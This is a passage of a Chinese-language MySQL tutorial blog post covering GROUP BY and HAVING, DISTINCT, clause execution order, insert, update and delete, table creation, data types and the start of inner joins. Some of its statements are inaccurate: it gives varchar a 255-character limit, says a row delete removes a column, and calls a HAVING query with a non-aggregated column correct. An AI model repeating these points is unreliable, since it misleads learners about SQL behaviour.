<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">示例三：</span><br><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> students <span class="keyword">where</span> grade <span class="operator">&gt;</span> <span class="built_in">avg</span>(grade);</span><br><span class="line">无效的使用了分组函数，将会报错，因为 <span class="keyword">sql</span>语句 规定分组函数不能出现在 <span class="keyword">where</span> 后面 </span><br><span class="line">解决方案：</span><br><span class="line">方案一：分两步</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">avg</span>(grade) <span class="keyword">from</span> students;</span><br><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> students <span class="keyword">where</span> grade <span class="operator">&gt;=</span> 上面所求得的值;</span><br><span class="line">方案二：子查询（<span class="keyword">select</span>语句中嵌套<span class="keyword">select</span>语句）</span><br><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> students <span class="keyword">where</span> grade <span class="operator">&gt;=</span> (<span class="keyword">select</span> <span class="built_in">avg</span>(grade) <span class="keyword">from</span> students)</span><br></pre></td></tr></table></figure>
<h3 id="七、group-by-与-having"><a href="#七、group-by-与-having" class="headerlink" title="七、group by 与 having"></a>七、group by 与 having</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">group</span> <span class="keyword">by</span>：按照某个字段或某些字段进行分组</span><br><span class="line"><span class="keyword">having</span>：对分组之后的数据进行再次过滤，即<span class="keyword">having</span> 必须跟在 <span class="keyword">group</span> <span class="keyword">by</span> 后面使用</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">max</span>(grade) <span class="keyword">from</span> students <span class="keyword">group</span> <span class="keyword">by</span> classes;</span><br><span class="line">先根据班级分组，再查出各个班级的成绩最高学生的成绩</span><br><span class="line"></span><br><span class="line">注：</span><br><span class="line">分组函数一般与 <span class="keyword">group</span> <span class="keyword">by</span> 联合使用，并且任何一个分组函数（count,sum,avg,max,min）都是在 <span class="keyword">group</span> <span class="keyword">by</span> 语句执行结束后才会执行</span><br><span class="line">当一条<span class="keyword">sql</span>语句没有 <span class="keyword">group</span> <span class="keyword">by</span> 时，整张表会自成一组</span><br><span class="line"></span><br><span class="line">当<span class="keyword">sql</span>语句中使用<span class="keyword">group</span> <span class="keyword">by</span>时，<span class="keyword">select</span>之后只能跟参与分组的字段或者分组函数</span><br><span class="line">注：实际上在 mysql 中，可以使用并且执行，但毫无意义；而由于 Oracle 比 Mysql 要更加严格，在 Oracle 中是绝对严格不能使用的。</span><br></pre></td></tr></table></figure>
<h4 id="多字段来联合分组"><a href="#多字段来联合分组" class="headerlink" title="多字段来联合分组"></a>多字段来联合分组</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id,grade <span class="keyword">from</span> students <span class="keyword">group</span> <span class="keyword">by</span> classes,sex;</span><br><span class="line">先依次按照班级，性别进行分组，再查出分组之后学生的id与grade</span><br></pre></td></tr></table></figure>

<h4 id="having-与-where"><a href="#having-与-where" class="headerlink" title="having 与 where"></a>having 与 where</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">示例一：找到每个班级成绩大于等于<span class="number">700</span>学生中的最高成绩，该案例使用 <span class="keyword">where</span> 与 <span class="keyword">having</span> 过滤均可</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">max</span>(grade) <span class="keyword">from</span> students <span class="keyword">group</span> <span class="keyword">by</span> classes <span class="keyword">having</span> grade <span class="operator">&gt;=</span> <span class="number">700</span>;</span><br><span class="line">先进性班级分组，然后使用<span class="keyword">having</span> 过滤</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">max</span>(grade) <span class="keyword">from</span> students <span class="keyword">where</span> grade <span class="operator">&gt;=</span> <span class="number">700</span> <span class="keyword">group</span> <span class="keyword">by</span> classes;</span><br><span class="line">先使用<span class="keyword">where</span>进行条件过滤，然后再进行班级分组</span><br><span class="line">说明：两种方法均可，但是该示例中 <span class="keyword">where</span>比<span class="keyword">having</span> 的效率要高，因为 <span class="keyword">where</span> 中参与分组的数据比 <span class="keyword">having</span> 要少</span><br><span class="line"> </span><br><span class="line">示例二：找到每个班级成绩大于等于平均成绩的学生的学号，该案例只能使用 <span class="keyword">having</span> 进行过滤</span><br><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> students <span class="keyword">group</span> <span class="keyword">by</span> classes <span class="keyword">having</span> grade <span class="operator">&gt;=</span> <span class="built_in">avg</span>(grade);</span><br><span class="line">使用 <span class="keyword">having</span>  过滤，正确</span><br><span class="line"><span class="keyword">select</span> id <span class="keyword">from</span> students <span class="keyword">where</span> grade <span class="operator">&gt;=</span> <span class="built_in">avg</span>(grade) <span class="keyword">group</span> <span class="keyword">by</span> classes;</span><br><span class="line">使用 <span class="keyword">where</span>语句过滤，错误，由于 <span class="keyword">where</span>语句之后不能出现分组函数</span><br><span class="line"></span><br><span class="line">总结：能使用 <span class="keyword">where</span> 最好使用 <span class="keyword">where</span> ,只有当只能使用 <span class="keyword">having</span> 才能满足需求时，再使用 <span class="keyword">having</span> 。</span><br></pre></td></tr></table></figure>
<h3 id="八、查询结果集的去重"><a href="#八、查询结果集的去重" class="headerlink" title="八、查询结果集的去重"></a>八、查询结果集的去重</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">distinct</span> 关键字  去除重复记录</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> job <span class="keyword">from</span> company;</span><br><span class="line">查询该公司中的工作岗位</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="keyword">distinct</span> job) <span class="keyword">from</span> company;</span><br><span class="line">统计该公司中工作岗位数量</span><br><span class="line">注：</span><br><span class="line"><span class="keyword">distinct</span> 只能出现在所有字段的最前面，表示将后面的字段联合起来一起去重</span><br></pre></td></tr></table></figure>
<h3 id="九、一个完整的-sql语句-执行顺序"><a href="#九、一个完整的-sql语句-执行顺序" class="headerlink" title="九、一个完整的 sql语句   执行顺序"></a>九、一个完整的 sql语句   执行顺序</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span>     <span class="number">5</span>号：挑选出满足条件的数据</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span>       <span class="number">1</span>号：定表</span><br><span class="line"></span><br><span class="line"><span class="keyword">where</span>      <span class="number">2</span>号：过滤原始数据</span><br><span class="line"></span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span>   <span class="number">3</span>号：进行分组</span><br><span class="line"> </span><br><span class="line"><span class="keyword">having</span>     <span class="number">4</span>号：对数据进行再次过滤</span><br><span class="line"></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span>   <span class="number">6</span>号：进行排序</span><br></pre></td></tr></table></figure>

<h1 id="DML-数据操作语言"><a href="#DML-数据操作语言" class="headerlink" title="DML (数据操作语言)"></a>DML (数据操作语言)</h1><p><strong>插入数据 insert</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> 表名(字段名<span class="number">1</span>，字段名<span class="number">2</span>，字段名<span class="number">3.</span>.....) <span class="keyword">values</span>(值<span class="number">1</span>，值<span class="number">2</span>，值<span class="number">3.</span>.....)；</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">注：</span><br><span class="line">字段的数据类型要与值对应，值的数量小于等于字段的数量，小于时，未被插入数据的字段为指定的默认值。</span><br><span class="line">例如：</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_stu(<span class="keyword">no</span>,name) <span class="keyword">values</span>(<span class="number">2007040202</span>,<span class="string">&#x27;lijun&#x27;</span>);</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t_stu;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+----------+------+-------+----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">no</span>         <span class="operator">|</span> name     <span class="operator">|</span> sex  <span class="operator">|</span> birth <span class="operator">|</span> classno  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+----------+------+-------+----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2007040201</span> <span class="operator">|</span> xiaoming <span class="operator">|</span> <span class="number">1</span>    <span class="operator">|</span> <span class="number">2002</span>  <span class="operator">|</span> <span class="number">20070402</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2007040202</span> <span class="operator">|</span> lijun    <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>  <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+----------+------+-------+----------+</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">当一条<span class="keyword">insert</span>语句执行成功之后，表格中必然会多一行记录，即使为 <span class="keyword">NULL</span> 也不能再使用 <span class="keyword">insert</span> 进行插入，只能通过 update 进行更新。</span><br><span class="line">举例：</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_stu(sex,birth,classno) <span class="keyword">values</span>(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2002&#x27;</span>,<span class="string">&#x27;20070402&#x27;</span>);</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t_stu;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+----------+------+-------+----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">no</span>         <span class="operator">|</span> name     <span class="operator">|</span> sex  <span class="operator">|</span> birth <span class="operator">|</span> classno  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+----------+------+-------+----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2007040201</span> <span class="operator">|</span> xiaoming <span class="operator">|</span> <span class="number">1</span>    <span class="operator">|</span> <span class="number">2002</span>  <span class="operator">|</span> <span class="number">20070402</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2007040202</span> <span class="operator">|</span> lijun    <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>  <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>       <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span> <span class="number">1</span>    <span class="operator">|</span> <span class="number">2002</span>  <span class="operator">|</span> <span class="number">20070402</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+----------+------+-------+----------+</span></span><br><span class="line"></span><br><span class="line">字段名可以省略，但是值是数量与顺序必须与字段的数量与顺序相对应</span><br><span class="line">举例：</span><br><span class="line"> <span class="keyword">insert</span> <span class="keyword">into</span> t_stu <span class="keyword">values</span>(<span class="number">2007040203</span>,<span class="string">&#x27;zhangsan&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2001&#x27;</span>,<span class="string">&#x27;20070402&#x27;</span>);</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t_stu;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+----------+------+-------+----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">no</span>         <span class="operator">|</span> name     <span class="operator">|</span> sex  <span class="operator">|</span> birth <span class="operator">|</span> classno  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+----------+------+-------+----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2007040201</span> <span class="operator">|</span> xiaoming <span class="operator">|</span> <span class="number">1</span>    <span class="operator">|</span> <span class="number">2002</span>  <span class="operator">|</span> <span class="number">20070402</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2007040202</span> <span class="operator">|</span> lijun    <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>  <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>       <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span> <span class="number">1</span>    <span class="operator">|</span> <span class="number">2002</span>  <span class="operator">|</span> <span class="number">20070402</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2007040203</span> <span class="operator">|</span> zhangsan <span class="operator">|</span> <span class="number">1</span>    <span class="operator">|</span> <span class="number">2001</span>  <span class="operator">|</span> <span class="number">20070402</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+----------+------+-------+----------+</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">insert</span> <span class="keyword">into</span> t_stu <span class="keyword">values</span>(<span class="number">2007040203</span>,<span class="string">&#x27;xiaohong&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"> mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t_stu;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+----------+------+-------+----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">no</span>         <span class="operator">|</span> name     <span class="operator">|</span> sex  <span class="operator">|</span> birth <span class="operator">|</span> classno  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+----------+------+-------+----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2007040201</span> <span class="operator">|</span> xiaoming <span class="operator">|</span> <span class="number">1</span>    <span class="operator">|</span> <span class="number">2002</span>  <span class="operator">|</span> <span class="number">20070402</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2007040202</span> <span class="operator">|</span> lijun    <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>  <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>       <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span> <span class="number">1</span>    <span class="operator">|</span> <span class="number">2002</span>  <span class="operator">|</span> <span class="number">20070402</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2007040203</span> <span class="operator">|</span> zhangsan <span class="operator">|</span> <span class="number">1</span>    <span class="operator">|</span> <span class="number">2001</span>  <span class="operator">|</span> <span class="number">20070402</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2007040203</span> <span class="operator">|</span> xiaohong <span class="operator">|</span> <span class="number">0</span>    <span class="operator">|</span>       <span class="operator">|</span>          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+----------+------+-------+----------+</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> 一次可插入多行数据</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_stu(<span class="keyword">no</span>,name,sex,birth,classno) <span class="keyword">values</span>(),(),()......;</span><br></pre></td></tr></table></figure>

<p><strong>修改数据 update</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">update 表名 <span class="keyword">set</span> 字段名<span class="number">1</span><span class="operator">=</span>值<span class="number">1</span>,字段名<span class="number">2</span><span class="operator">=</span>值<span class="number">2</span>,......<span class="keyword">where</span> 条件；</span><br></pre></td></tr></table></figure>
<p><strong>删除数据 delete</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">语法:</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> 条件;	  #可回滚</span><br><span class="line">对于大表：</span><br><span class="line"><span class="keyword">truncate</span> <span class="keyword">table</span> 表名;				#不可回滚，将会永久丢失</span><br></pre></td></tr></table></figure>

<h1 id="DDL-数据定义语言"><a href="#DDL-数据定义语言" class="headerlink" title="DDL(数据定义语言)"></a>DDL(数据定义语言)</h1><p><strong>表的创建</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名(</span><br><span class="line">     字段名<span class="number">1</span>，数据类型，</span><br><span class="line">     字段名<span class="number">2</span>，数据类型，</span><br><span class="line">     字段名<span class="number">3</span>，数据类型，</span><br><span class="line">     ......</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查看创建表的语法：</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> <span class="operator">+</span> 表名;</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> if <span class="keyword">exists</span> t1;</span><br></pre></td></tr></table></figure>
<p><strong>Mysql 中常见的数据类型</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>       整型</span><br><span class="line"><span class="type">bigint</span>    长整型</span><br><span class="line"><span class="type">smallint</span></span><br><span class="line">mediumint</span><br><span class="line"></span><br><span class="line"><span class="type">float</span>     浮点型</span><br><span class="line"><span class="keyword">double</span>    </span><br><span class="line"></span><br><span class="line"><span class="type">char</span>      定长字符串</span><br><span class="line"><span class="type">varchar</span>   可变长字符串(最多存储<span class="number">255</span>个字符)</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span>			多选插入</span><br><span class="line">enum		单选插入</span><br><span class="line">text</span><br><span class="line"></span><br><span class="line">data      日期类型</span><br><span class="line"><span class="keyword">year</span></span><br><span class="line"><span class="type">timestamp</span></span><br><span class="line"><span class="type">time</span></span><br><span class="line">datetime</span><br><span class="line"></span><br><span class="line"><span class="type">BLOB</span>      二进制大对象(存储图片，视频等流媒体信息)</span><br><span class="line"><span class="type">CLOB</span>      字符大对象(存储较大的文本)</span><br></pre></td></tr></table></figure>
<p>测试：时间类型</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="type">time</span>(</span><br><span class="line">	id <span class="type">int</span> <span class="keyword">primary</span> key auto_increment,</span><br><span class="line">    myYear <span class="keyword">year</span>,</span><br><span class="line">    myTime <span class="type">time</span>,</span><br><span class="line">    myDate <span class="type">date</span>,</span><br><span class="line">    myDataTime datetime</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> now();</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+</span></span><br><span class="line"><span class="operator">|</span> now()               <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2021</span><span class="number">-11</span><span class="number">-21</span> <span class="number">17</span>:<span class="number">11</span>:<span class="number">46</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">current_time</span>();</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">current_time</span>() <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">17</span>:<span class="number">11</span>:<span class="number">52</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="type">time</span>(myYear,myTime,myDate,myDataTime) <span class="keyword">values</span>(now(),now(),now(),now());</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="type">time</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+----------+------------+---------------------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> myYear <span class="operator">|</span> myTime   <span class="operator">|</span> myDate     <span class="operator">|</span> myDataTime          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+----------+------------+---------------------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span>   <span class="number">2021</span> <span class="operator">|</span> <span class="number">17</span>:<span class="number">14</span>:<span class="number">06</span> <span class="operator">|</span> <span class="number">2021</span><span class="number">-11</span><span class="number">-21</span> <span class="operator">|</span> <span class="number">2021</span><span class="number">-11</span><span class="number">-21</span> <span class="number">17</span>:<span class="number">14</span>:<span class="number">06</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+----------+------------+---------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<p>测试：enum  set</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> table_enum(</span><br><span class="line">	id <span class="type">int</span> <span class="keyword">primary</span> key auto_increment,</span><br><span class="line">    aa enum(&quot;qqq&quot;,&quot;www&quot;,&quot;eee&quot;,&quot;qwer&quot;)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">正确测试：</span><br><span class="line">只能在 以上中选择数据进行插入，别的数据不可进行插入</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> table_enum(aa) <span class="keyword">values</span>(&quot;qqq&quot;);  #数字对应<span class="number">1</span> </span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> table_enum(aa) <span class="keyword">values</span>(&quot;www&quot;);  #数字对应<span class="number">2</span> </span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> table_enum(aa) <span class="keyword">values</span>(&quot;eee&quot;);  #数字对应<span class="number">3</span> </span><br><span class="line"></span><br><span class="line">错误测试：</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> table_enum(aa) <span class="keyword">values</span>(&quot;zzz&quot;);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> table_enum(aa) <span class="keyword">values</span>(&quot;qqq,www&quot;);</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">insert</span> <span class="keyword">into</span> table_enum(aa) <span class="keyword">values</span>(&quot;4&quot;);</span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_enum;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> aa   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> qqq  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> www  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> qwer <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> table_set(</span><br><span class="line">	id <span class="type">int</span> <span class="keyword">primary</span> key auto_increment,</span><br><span class="line">    aa <span class="keyword">set</span>(&quot;qqq&quot;,&quot;www&quot;,&quot;eee&quot;,&quot;qwer&quot;)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> table_set(aa) <span class="keyword">values</span>(&quot;qqq&quot;);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> table_set(aa) <span class="keyword">values</span>(&quot;www&quot;);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> table_set(aa) <span class="keyword">values</span>(&quot;3&quot;);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> table_set(aa) <span class="keyword">values</span>(&quot;qqq,www&quot;);</span><br></pre></td></tr></table></figure>

<p><strong>char 与 varchar 的选择</strong></p>
<blockquote>
<p><strong>解释</strong>：<br><strong>char(10)</strong>:可以存储长度为1<del>10的字符串，不论所要存储的字符串长度为几，均固定划分10个空间去存储。也就是说，即使存储的字符串长度为4，也仍然会有6个空间剩余。<br>**varchar(10)**：可以存储长度为1</del>10的字符串，区别在于，varchar可以根据存储的数据进行 <strong>动态分配空间</strong>，即如果存储的字符串长度为4，就只分配4个空间，没有剩余。</p>
</blockquote>
<blockquote>
<p><strong>使用</strong>：<br>当某个字段中的数据长度为定长时，采用char;   如果插入的数据大于本身定义的char大小，将会自动截断<br>当某个字段中的数据长度不确定时，采用varchar</p>
<p>char 查询速度 &gt; varchar</p>
</blockquote>
<p>建议：建表时表明最好以<code>t_或者tbl_</code>开始</p>
<p><strong>表的复制</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">将查询结果当作表创建出来：</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名 <span class="keyword">as</span> <span class="keyword">select</span>语句;</span><br><span class="line">将查询结果作为数据插入到表中：</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> 表名 <span class="keyword">select</span>语句；</span><br></pre></td></tr></table></figure>
<p><strong>表的删除</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> if <span class="keyword">exists</span> 表名;	#Oracle不支持</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> 表名;         		#通用</span><br></pre></td></tr></table></figure>

<p><strong>扩展：</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="keyword">alter</span>添加一列：</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">alter</span> <span class="keyword">table</span> <span class="type">time</span> <span class="keyword">add</span> <span class="keyword">column</span> address <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">default</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.03</span> sec)</span><br><span class="line">Records: <span class="number">1</span>  Duplicates: <span class="number">0</span>  Warnings: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="type">time</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+----------+------------+---------------------+---------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> myYear <span class="operator">|</span> myTime   <span class="operator">|</span> myDate     <span class="operator">|</span> myDataTime          <span class="operator">|</span> address <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+----------+------------+---------------------+---------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span>   <span class="number">2021</span> <span class="operator">|</span> <span class="number">17</span>:<span class="number">14</span>:<span class="number">06</span> <span class="operator">|</span> <span class="number">2021</span><span class="number">-11</span><span class="number">-21</span> <span class="operator">|</span> <span class="number">2021</span><span class="number">-11</span><span class="number">-21</span> <span class="number">17</span>:<span class="number">14</span>:<span class="number">06</span> <span class="operator">|</span>         <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+----------+------------+---------------------+---------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"># <span class="keyword">alter</span> 删除一列：</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> <span class="type">time</span> <span class="keyword">drop</span> <span class="keyword">column</span> address;</span><br><span class="line"></span><br><span class="line">#<span class="keyword">delete</span> 对表的操作</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> <span class="type">time</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>;		#删除一列</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> <span class="type">time</span>;					#删除一整张表</span><br></pre></td></tr></table></figure>



<h1 id="内连接"><a href="#内连接" class="headerlink" title="内连接"></a>内连接</h1><h3 id="等值连接"><a href="#等值连接" class="headerlink" title="等值连接"></a>等值连接</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">特点：条件是等量关系</span><br><span class="line"></span><br><span class="line">语法：</span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">inner</span> <span class="keyword">join</span>  	#<span class="keyword">inner</span> 可省略</span><br><span class="line"></span><br><span class="line"><span class="keyword">on</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">where</span></span><br></pre></td></tr></table></figure>
